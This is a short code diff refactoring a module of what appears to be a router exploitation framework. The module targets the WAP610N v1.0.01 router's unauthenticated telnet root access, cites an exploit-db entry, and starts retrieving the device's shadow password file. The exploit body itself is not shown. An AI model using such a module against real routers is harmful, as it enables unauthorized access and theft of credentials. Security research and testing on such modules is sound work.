@@ -2,15 +2,15 @@ import telnetlib
 import util
 from ..router_vuln import RouterVuln
 
-__router__ = 'WAP610N v1.0.01'
-__vuln__='Unauthenticated File Disclosure'
-class DumpFiles(RouterVuln):
+class wap610n_dump(RouterVuln):
 	"""Unauthenticated root access over telnet
 	   http://www.exploit-db.com/exploits/16149/
 	"""
 	
 	def __init__(self):
-		super(DumpFiles,self).__init__()
+		self.router = 'WAP610N v1.0.01'
+		self.vuln   = 'Unauthenticated File Disclosure'
+		super(wap610n_dump,self).__init__()
 
 	def run(self):
 		util.Msg('Retrieving shadow...')
